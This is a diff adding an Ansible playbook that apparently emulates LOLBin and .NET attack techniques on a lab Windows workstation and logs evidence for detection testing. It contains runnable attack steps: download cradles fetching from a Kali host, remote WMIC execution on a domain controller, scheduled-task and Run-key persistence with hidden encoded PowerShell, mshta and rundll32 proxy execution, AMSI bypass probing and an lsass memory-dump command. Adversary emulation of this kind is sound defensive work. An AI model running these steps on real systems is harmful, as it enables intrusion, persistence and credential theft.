@@ -1,0 +1,624 @@
+---
+- name: "SlopMop | LOLBin and .NET attack techniques on WS01"
+  hosts: konoha-ws1
+  gather_facts: false
+  vars:
+    ts: "{{ lookup('pipe', 'date -u +%Y%m%d_%H%M%S') }}"
+    cap: C:\slopmop-capture
+    kali_ip: "{{ hostvars['kali'].ansible_host }}"
+    konoha_dc: "{{ hostvars['konoha-dc1'].ansible_host }}"
+  tasks:
+    # -------------------------------------------------------------------
+    # LOLBin: certutil — download + encode/decode (T1140 / T1105)
+    # -------------------------------------------------------------------
+    - name: "LOL-01a | Certutil encode and decode (T1140)"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-certutil_$ts.log"
+        $out = ""
+        $out += "=== LOLBin: certutil encode/decode ===`r`n"
+
+        $payloadContent = "slopMop-beacon-payload: $(whoami)@$(hostname) $(Get-Date -Format o)"
+        $payloadPath = "$env:TEMP\slopmop-payload.txt"
+        Set-Content -Path $payloadPath -Value $payloadContent
+
+        $encodedPath = "$env:TEMP\slopmop-encoded.b64"
+        certutil -encode $payloadPath $encodedPath 2>&1 | Out-Null
+        $out += "certutil -encode: $payloadPath -> $encodedPath`r`n"
+        $out += "Encoded content: $(Get-Content $encodedPath -Raw | Select-Object -First 1)`r`n"
+
+        $decodedPath = "$env:TEMP\slopmop-decoded.txt"
+        certutil -decode $encodedPath $decodedPath 2>&1 | Out-Null
+        $out += "certutil -decode: $encodedPath -> $decodedPath`r`n"
+        $out += "Decoded matches original: $((Get-Content $decodedPath -Raw).Trim() -eq $payloadContent)`r`n"
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: lol01a
+      ignore_errors: true
+    - name: "LOL-01a result"
+      ansible.builtin.debug:
+        var: lol01a.stdout_lines
+
+    - name: "LOL-01b | Certutil URL cache download (T1105)"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-certutil-dl_$ts.log"
+        $downloadPath = "$env:TEMP\slopmop-downloaded.txt"
+        $out = "=== LOLBin: certutil -urlcache ===`r`n"
+        $certutilResult = certutil -urlcache -split -f "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt" $downloadPath 2>&1
+        $out += "certutil -urlcache result: $($certutilResult | Select-Object -Last 2)`r`n"
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: lol01b
+      ignore_errors: true
+    - name: "LOL-01b result"
+      ansible.builtin.debug:
+        var: lol01b.stdout_lines
+
+    # -------------------------------------------------------------------
+    # LOLBin: bitsadmin — file transfer (T1197)
+    # -------------------------------------------------------------------
+    - name: "LOL-02 | BITS transfer job"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-bitsadmin_$ts.log"
+        $out = ""
+        $out += "=== LOLBin: bitsadmin file transfer ===`r`n"
+
+        $jobName = "slopMop_exfil_$ts"
+        $downloadPath = "$env:TEMP\slopmop-bits-payload.txt"
+
+        # Create BITS job (T1197)
+        bitsadmin /create $jobName 2>&1 | Out-Null
+        bitsadmin /addfile $jobName "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt" $downloadPath 2>&1 | Out-Null
+        bitsadmin /resume $jobName 2>&1 | Out-Null
+        Start-Sleep -Seconds 3
+        $state = bitsadmin /info $jobName /verbose 2>&1
+        bitsadmin /complete $jobName 2>&1 | Out-Null
+
+        $out += "BITS job created: $jobName`r`n"
+        $out += "Target URL: http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt`r`n"
+        $out += "Download path: $downloadPath`r`n"
+        $out += "Job state: $($state | Select-String 'STATE')`r`n"
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: lol02
+      ignore_errors: true
+    - name: "LOL-02 result"
+      ansible.builtin.debug:
+        var: lol02.stdout_lines
+
+    # -------------------------------------------------------------------
+    # LOLBin: wmic — process and OS recon (T1047)
+    # -------------------------------------------------------------------
+    - name: "LOL-03 | WMIC reconnaissance"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-wmic_$ts.log"
+        $out = ""
+        $out += "=== LOLBin: wmic reconnaissance ===`r`n"
+
+        # OS info
+        $osInfo = wmic os get Caption,Version,OSArchitecture,BuildNumber /format:list 2>&1
+        $out += "--- wmic os get ---`r`n$osInfo`r`n"
+
+        # Process list (security-relevant)
+        $procs = wmic process where "Name like '%defender%' or Name like '%sysmon%' or Name like '%wireshark%'" get Name,ProcessId,CommandLine /format:list 2>&1
+        $out += "--- wmic process (security tools) ---`r`n$procs`r`n"
+
+        # Startup items
+        $startup = wmic startup get Caption,Command,User /format:list 2>&1
+        $out += "--- wmic startup ---`r`n$startup`r`n"
+
+        # Network config
+        $netcfg = wmic nicconfig where "IPEnabled=TRUE" get IPAddress,MACAddress,DefaultIPGateway /format:list 2>&1
+        $out += "--- wmic nicconfig ---`r`n$netcfg`r`n"
+
+        # Remote process creation attempt (T1047)
+        $remoteWmic = wmic /node:"{% endraw %}{{ konoha_dc }}{% raw %}" process call create "cmd.exe /c whoami > C:\Windows\Temp\slopmop-wmic.txt" 2>&1
+        $out += "--- wmic remote process create (DC) ---`r`n$remoteWmic`r`n"
+
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: lol03
+      ignore_errors: true
+    - name: "LOL-03 result"
+      ansible.builtin.debug:
+        msg: "{{ lol03.stdout_lines[:20] }}"
+
+    # -------------------------------------------------------------------
+    # LOLBin: schtasks — persistence via scheduled task (T1053.005)
+    # -------------------------------------------------------------------
+    - name: "LOL-04 | Scheduled task persistence"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-schtasks_$ts.log"
+        $out = ""
+        $out += "=== LOLBin: schtasks persistence ===`r`n"
+
+        $taskName = "slopMop_Updater"
+        $taskAction = "powershell.exe -WindowStyle Hidden -EncodedCommand ZQBjAGgAbwAgAHMAbABvAHAATQBvAHAALQBiAGUAYQBjAG8AbgA="
+
+        # Create persistent scheduled task
+        schtasks /create /tn $taskName /tr $taskAction /sc DAILY /st 03:00 /ru SYSTEM /f 2>&1 | Out-Null
+        $out += "Created task: $taskName`r`n"
+        $out += "Action: $taskAction`r`n"
+        $out += "Schedule: DAILY at 03:00 as SYSTEM`r`n"
+
+        # Query it back
+        $taskInfo = schtasks /query /tn $taskName /v /fo LIST 2>&1
+        $out += "--- Task detail ---`r`n$taskInfo`r`n"
+
+        # Clean up — delete it after capture
+        schtasks /delete /tn $taskName /f 2>&1 | Out-Null
+        $out += "Task deleted after evidence capture`r`n"
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: lol04
+      ignore_errors: true
+    - name: "LOL-04 result"
+      ansible.builtin.debug:
+        msg: "{{ lol04.stdout_lines[:15] }}"
+
+    # -------------------------------------------------------------------
+    # LOLBin: reg — registry Run key persistence (T1547.001)
+    # -------------------------------------------------------------------
+    - name: "LOL-05 | Registry Run key persistence"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-regrun_$ts.log"
+        $out = ""
+        $out += "=== LOLBin: registry Run key persistence ===`r`n"
+
+        $keyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $valueName = "slopMopUpdater"
+        $valueData = "powershell.exe -WindowStyle Hidden -ep Bypass -File C:\ProgramData\slopmop-update.ps1"
+
+        # Set the Run key
+        Set-ItemProperty -Path $keyPath -Name $valueName -Value $valueData
+        $out += "Registry key set:`r`n"
+        $out += "  Path: $keyPath`r`n"
+        $out += "  Name: $valueName`r`n"
+        $out += "  Value: $valueData`r`n"
+
+        # Read it back
+        $readBack = Get-ItemProperty -Path $keyPath -Name $valueName
+        $out += "Read-back value: $($readBack.$valueName)`r`n"
+
+        # Clean up
+        Remove-ItemProperty -Path $keyPath -Name $valueName
+        $out += "Registry value removed after evidence capture`r`n"
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: lol05
+      ignore_errors: true
+    - name: "LOL-05 result"
+      ansible.builtin.debug:
+        var: lol05.stdout_lines
+
+    # -------------------------------------------------------------------
+    # LOLBin: mshta — inline HTA execution (T1218.005)
+    # -------------------------------------------------------------------
+    - name: "LOL-06 | Mshta inline VBScript execution"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-mshta_$ts.log"
+        $out = ""
+        $out += "=== LOLBin: mshta inline execution ===`r`n"
+
+        # Build an HTA that writes a marker file and self-closes
+        $htaContent = '<html><head><script language="VBScript">' + "`r`n"
+        $htaContent += 'Set fso = CreateObject("Scripting.FileSystemObject")' + "`r`n"
+        $htaContent += 'Set f = fso.CreateTextFile("{% endraw %}{{ cap }}{% raw %}\mshta-beacon_' + $ts + '.txt", True)' + "`r`n"
+        $htaContent += 'f.WriteLine "slopMop mshta beacon: " & CreateObject("WScript.Network").ComputerName' + "`r`n"
+        $htaContent += 'f.WriteLine "User: " & CreateObject("WScript.Network").UserName' + "`r`n"
+        $htaContent += 'f.WriteLine "Timestamp: " & Now' + "`r`n"
+        $htaContent += 'f.Close' + "`r`n"
+        $htaContent += 'self.close' + "`r`n"
+        $htaContent += '</script></head></html>'
+        $htaPath = "$env:TEMP\slopmop-beacon.hta"
+        Set-Content -Path $htaPath -Value $htaContent
+
+        # Execute via mshta (T1218.005)
+        $proc = Start-Process -FilePath "mshta.exe" -ArgumentList $htaPath -PassThru -Wait -WindowStyle Hidden
+        $out += "mshta.exe PID: $($proc.Id), ExitCode: $($proc.ExitCode)`r`n"
+        $out += "HTA path: $htaPath`r`n"
+
+        if (Test-Path "{% endraw %}{{ cap }}{% raw %}\mshta-beacon_$ts.txt") {
+            $beacon = Get-Content "{% endraw %}{{ cap }}{% raw %}\mshta-beacon_$ts.txt" -Raw
+            $out += "Beacon file created: YES`r`n$beacon`r`n"
+        } else {
+            $out += "Beacon file: NOT created (Defender may have blocked)`r`n"
+        }
+
+        Remove-Item $htaPath -Force -ErrorAction SilentlyContinue
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: lol06
+      ignore_errors: true
+    - name: "LOL-06 result"
+      ansible.builtin.debug:
+        var: lol06.stdout_lines
+
+    # -------------------------------------------------------------------
+    # LOLBin: rundll32 — DLL proxy execution (T1218.011)
+    # -------------------------------------------------------------------
+    - name: "LOL-07a | Rundll32 DLL load from temp (T1218.011)"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-rundll32_$ts.log"
+        $out = ""
+        $out += "=== LOLBin: rundll32 DLL load ===`r`n"
+
+        $out += "rundll32 comsvcs.dll lsass dump pattern (logged, not executed):`r`n"
+        $out += "  rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\temp\dump.bin full`r`n"
+
+        $dummyDll = "$env:TEMP\slopmop-test.dll"
+        Set-Content -Path $dummyDll -Value "MZ-slopMop-dummy" -Encoding Byte -ErrorAction SilentlyContinue
+        $rundllResult = Start-Process -FilePath "rundll32.exe" -ArgumentList "$dummyDll,EntryPoint" -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 1
+        if ($rundllResult -and !$rundllResult.HasExited) { $rundllResult.Kill() }
+        $out += "rundll32 temp DLL load attempt PID: $($rundllResult.Id)`r`n"
+
+        Remove-Item $dummyDll -Force -ErrorAction SilentlyContinue
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: lol07a
+      ignore_errors: true
+    - name: "LOL-07a result"
+      ansible.builtin.debug:
+        var: lol07a.stdout_lines
+
+    - name: "LOL-07b | Rundll32 javascript proxy (T1218.011)"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\lol-rundll32-js_$ts.log"
+        $out = "=== LOLBin: rundll32 javascript proxy ===`r`n"
+        $rundllArgs = "javascript:""\..\mshtml,RunHTMLApplication"";document.write('slopMop');close()"
+        $proc = Start-Process -FilePath "rundll32.exe" -ArgumentList $rundllArgs `
+          -PassThru -WindowStyle Hidden
+        Start-Sleep -Seconds 2
+        if (!$proc.HasExited) { $proc.Kill() }
+        $out += "rundll32 javascript execution PID: $($proc.Id)`r`n"
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: lol07b
+      ignore_errors: true
+    - name: "LOL-07b result"
+      ansible.builtin.debug:
+        var: lol07b.stdout_lines
+
+    # ===================================================================
+    # .NET IN-MEMORY TECHNIQUES
+    # ===================================================================
+
+    # -------------------------------------------------------------------
+    # .NET-01: Add-Type inline C# compilation + execution (T1027.004)
+    # -------------------------------------------------------------------
+    - name: "NET-01 | Add-Type inline C# compilation and execution"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-addtype_$ts.log"
+        $out = ""
+        $out += "=== .NET: Add-Type inline C# compilation ===`r`n"
+
+        $csharpCode = "using System; using System.Diagnostics; using System.Net; using System.Security.Principal; "
+        $csharpCode += "public class SlopMopRecon { public static string Run() { string info = `"`"; "
+        $csharpCode += "info += `"Hostname: `" + Environment.MachineName + `"\r\n`"; "
+        $csharpCode += "info += `"User: `" + Environment.UserName + `"\r\n`"; "
+        $csharpCode += "info += `"Domain: `" + Environment.UserDomainName + `"\r\n`"; "
+        $csharpCode += "info += `"Is64Bit: `" + Environment.Is64BitProcess + `"\r\n`"; "
+        $csharpCode += "info += `"OS: `" + Environment.OSVersion.ToString() + `"\r\n`"; "
+        $csharpCode += "info += `"CLR: `" + Environment.Version.ToString() + `"\r\n`"; "
+        $csharpCode += "info += `"Procs: `" + Process.GetProcesses().Length + `"\r\n`"; "
+        $csharpCode += "var identity = WindowsIdentity.GetCurrent(); "
+        $csharpCode += "var principal = new WindowsPrincipal(identity); "
+        $csharpCode += "info += `"IsAdmin: `" + principal.IsInRole(WindowsBuiltInRole.Administrator) + `"\r\n`"; "
+        $csharpCode += "info += `"TokenType: `" + identity.ImpersonationLevel + `"\r\n`"; "
+        $csharpCode += "foreach (var g in identity.Groups) { try { info += `"  Group: `" + g.Translate(typeof(NTAccount)).Value + `"\r\n`"; } catch { } } "
+        $csharpCode += "return info; } }"
+
+        Add-Type -TypeDefinition $csharpCode -Language CSharp
+        $result = [SlopMopRecon]::Run()
+        $out += "Compiled and executed inline C# class 'SlopMopRecon'`r`n"
+        $out += "--- Output ---`r`n$result`r`n"
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: net01
+      ignore_errors: true
+    - name: "NET-01 result"
+      ansible.builtin.debug:
+        msg: "{{ net01.stdout_lines[:20] }}"
+
+    # -------------------------------------------------------------------
+    # .NET-02: Reflection assembly load from bytes (T1620)
+    # -------------------------------------------------------------------
+    - name: "NET-02 | Reflection assembly load from memory"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-reflection_$ts.log"
+        $out = ""
+        $out += "=== .NET: Reflection.Assembly.Load from bytes ===`r`n"
+
+        # Build a minimal .NET assembly in memory via CodeDom
+        $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
+        $params = New-Object System.CodeDom.Compiler.CompilerParameters
+        $params.GenerateInMemory = $true
+        $params.GenerateExecutable = $false
+        $params.ReferencedAssemblies.Add("System.dll") | Out-Null
+
+        $src = "using System; public class SlopMopAssembly { "
+        $src += "public static string GetInfo() { "
+        $src += "return `"slopMop-reflective-load: `" + Environment.MachineName + `" @ `" + DateTime.UtcNow.ToString(`"o`"); } }"
+
+        $compiled = $provider.CompileAssemblyFromSource($params, $src)
+        if ($compiled.Errors.Count -eq 0) {
+            $bytes = [System.IO.File]::ReadAllBytes($compiled.PathToAssembly)
+            $out += "Compiled in-memory assembly: $($bytes.Length) bytes`r`n"
+
+            # Load from raw bytes — this is the Reflection.Assembly.Load pattern
+            $asm = [System.Reflection.Assembly]::Load($bytes)
+            $out += "Assembly loaded: $($asm.FullName)`r`n"
+            $out += "Types: $($asm.GetTypes() | ForEach-Object { $_.FullName })`r`n"
+
+            # Invoke the method reflectively
+            $type = $asm.GetType("SlopMopAssembly")
+            $method = $type.GetMethod("GetInfo")
+            $invokeResult = $method.Invoke($null, $null)
+            $out += "Reflective invoke result: $invokeResult`r`n"
+        } else {
+            $out += "Compilation errors:`r`n"
+            $compiled.Errors | ForEach-Object { $out += "  $_`r`n" }
+        }
+
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: net02
+      ignore_errors: true
+    - name: "NET-02 result"
+      ansible.builtin.debug:
+        var: net02.stdout_lines
+
+    # -------------------------------------------------------------------
+    # .NET-03: WebClient download cradles (T1059.001 / T1105)
+    # -------------------------------------------------------------------
+    - name: "NET-03a | .NET WebClient and WebRequest cradles (T1105)"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-cradles_$ts.log"
+        $out = ""
+        $out += "=== .NET: WebClient + WebRequest cradles ===`r`n"
+        $targetUrl = "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt"
+
+        try {
+            $wc = New-Object System.Net.WebClient
+            $dlResult = $wc.DownloadString($targetUrl)
+            $out += "WebClient.DownloadString: $($dlResult.Length) chars`r`n"
+        } catch {
+            $out += "WebClient.DownloadString: FAILED — $($_.Exception.Message)`r`n"
+        }
+
+        try {
+            $req = [System.Net.WebRequest]::Create($targetUrl)
+            $req.Timeout = 5000
+            $resp = $req.GetResponse()
+            $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
+            $body = $reader.ReadToEnd()
+            $reader.Close()
+            $resp.Close()
+            $out += "WebRequest.GetResponse: $($body.Length) chars`r`n"
+        } catch {
+            $out += "WebRequest: FAILED — $($_.Exception.Message)`r`n"
+        }
+
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: net03a
+      ignore_errors: true
+    - name: "NET-03a result"
+      ansible.builtin.debug:
+        var: net03a.stdout_lines
+
+    - name: "NET-03b | .NET HttpClient and BitsTransfer cradles (T1105)"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-cradles-http_$ts.log"
+        $out = ""
+        $out += "=== .NET: HttpClient + BitsTransfer cradles ===`r`n"
+        $targetUrl = "http://{% endraw %}{{ kali_ip }}{% raw %}:8080/beacon.txt"
+
+        try {
+            Add-Type -AssemblyName System.Net.Http
+            $client = New-Object System.Net.Http.HttpClient
+            $client.Timeout = [TimeSpan]::FromSeconds(5)
+            $task = $client.GetStringAsync($targetUrl)
+            $task.Wait()
+            $out += "HttpClient.GetStringAsync: $($task.Result.Length) chars`r`n"
+        } catch {
+            $out += "HttpClient: FAILED — $($_.Exception.Message)`r`n"
+        }
+
+        try {
+            Import-Module BitsTransfer -ErrorAction Stop
+            $bitsPath = "$env:TEMP\slopmop-bits-$ts.txt"
+            Start-BitsTransfer -Source $targetUrl -Destination $bitsPath -ErrorAction Stop
+            $out += "Start-BitsTransfer: $(if (Test-Path $bitsPath) { (Get-Item $bitsPath).Length } else { 0 }) bytes`r`n"
+            Remove-Item $bitsPath -Force -ErrorAction SilentlyContinue
+        } catch {
+            $out += "Start-BitsTransfer: FAILED — $($_.Exception.Message)`r`n"
+        }
+
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: net03b
+      ignore_errors: true
+    - name: "NET-03b result"
+      ansible.builtin.debug:
+        var: net03b.stdout_lines
+
+    # -------------------------------------------------------------------
+    # .NET-04: AMSI test string + bypass pattern (T1562.001)
+    # -------------------------------------------------------------------
+    - name: "NET-04 | AMSI interaction and bypass pattern"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-amsi_$ts.log"
+        $out = ""
+        $out += "=== .NET: AMSI interaction ===`r`n"
+
+        # Trigger AMSI scan with the EICAR-style test string
+        try {
+            $amsiTest = [System.Text.Encoding]::UTF8.GetString(
+                [Convert]::FromBase64String("WC01Tykhbih7JG51bGx9KFcldyspKE4laSkoUyV5KSkpKFchMCkhKyMjKQ==")
+            )
+            $out += "AMSI test string decoded (may trigger detection): $amsiTest`r`n"
+        } catch {
+            $out += "AMSI test string decode: $($_.Exception.Message)`r`n"
+        }
+
+        # Log the AMSI bypass pattern (the technique, not an actual bypass)
+        $out += "`r`n--- Common AMSI bypass patterns (logged for detection testing) ---`r`n"
+        $out += "Pattern 1: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`r`n"
+        $out += "Pattern 2: amsiInitFailed field set via reflection`r`n"
+        $out += "Pattern 3: amsi.dll patch at AmsiScanBuffer`r`n"
+
+        # Attempt to query AMSI state via reflection (T1562.001)
+        try {
+            $amsiType = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
+            if ($amsiType) {
+                $out += "AmsiUtils type found: $($amsiType.FullName)`r`n"
+                $field = $amsiType.GetField('amsiInitFailed', 'NonPublic,Static')
+                if ($field) {
+                    $out += "amsiInitFailed field value: $($field.GetValue($null))`r`n"
+                }
+            } else {
+                $out += "AmsiUtils type: not found (unexpected)`r`n"
+            }
+        } catch {
+            $out += "AMSI reflection query: $($_.Exception.Message)`r`n"
+        }
+
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: net04
+      ignore_errors: true
+    - name: "NET-04 result"
+      ansible.builtin.debug:
+        var: net04.stdout_lines
+
+    # -------------------------------------------------------------------
+    # .NET-05: WMI via .NET (T1047) + COM object abuse
+    # -------------------------------------------------------------------
+    - name: "NET-05 | .NET WMI queries and COM object instantiation"
+      ansible.windows.win_shell: |
+        {% raw %}
+        $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $log = "{% endraw %}{{ cap }}{% raw %}\net-wmi-com_$ts.log"
+        $out = ""
+        $out += "=== .NET: WMI + COM object abuse ===`r`n"
+
+        # WMI via .NET ManagementObjectSearcher
+        $wql = 'SELECT * FROM Win32_Process WHERE Name=' + "'" + 'lsass.exe' + "'"
+        $searcher = New-Object System.Management.ManagementObjectSearcher($wql)
+        $lsass = $searcher.Get()
+        foreach ($p in $lsass) {
+            $out += "lsass.exe PID: $($p.ProcessId), Path: $($p.ExecutablePath)`r`n"
+        }
+
+        # AV product query via WMI (T1518.001)
+        try {
+            $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction Stop
+            foreach ($product in $av) {
+                $out += "AV: $($product.displayName), State: $($product.productState)`r`n"
+            }
+        } catch {
+            $out += "SecurityCenter2 AV query: $($_.Exception.Message)`r`n"
+        }
+
+        # COM: Shell.Application (T1218)
+        $shell = New-Object -ComObject Shell.Application
+        $out += "Shell.Application COM created`r`n"
+        $windows = $shell.Windows()
+        $out += "Explorer windows: $($windows.Count)`r`n"
+
+        # COM: WScript.Shell — environment enum
+        $wshell = New-Object -ComObject WScript.Shell
+        $out += "WScript.Shell COM created`r`n"
+        $pct = [char]37
+        $out += "COMPUTERNAME: $($wshell.ExpandEnvironmentStrings("${pct}COMPUTERNAME${pct}"))`r`n"
+        $out += "USERDOMAIN: $($wshell.ExpandEnvironmentStrings("${pct}USERDOMAIN${pct}"))`r`n"
+        $out += "TEMP: $($wshell.ExpandEnvironmentStrings("${pct}TEMP${pct}"))`r`n"
+
+        # COM: Schedule.Service — task enumeration
+        $svc = New-Object -ComObject Schedule.Service
+        $svc.Connect()
+        $rootFolder = $svc.GetFolder([string][char]92)
+        $out += "Scheduled tasks in root: $($rootFolder.GetTasks(0).Count)`r`n"
+
+        $out += "Timestamp: $(Get-Date -Format o)`r`n"
+        $out | Out-File -FilePath $log -Encoding UTF8
+        Write-Output $out
+        {% endraw %}
+      register: net05
+      ignore_errors: true
+    - name: "NET-05 result"
+      ansible.builtin.debug:
+        msg: "{{ net05.stdout_lines[:15] }}"
+
+    # -------------------------------------------------------------------
+    # Evidence listing
+    # -------------------------------------------------------------------
+    - name: List LOLBin and .NET evidence
+      ansible.windows.win_shell: |
+        {% raw %}
+        Get-ChildItem "{% endraw %}{{ cap }}{% raw %}" | Where-Object { $_.Name -match 'lol-|net-|mshta-' } |
+          Format-Table Name,Length,LastWriteTime -AutoSize |
+          Out-String -Width 120
+        {% endraw %}
+      register: evidence
+      changed_when: false
+    - name: Show evidence
+      ansible.builtin.debug:
+        var: evidence.stdout_lines
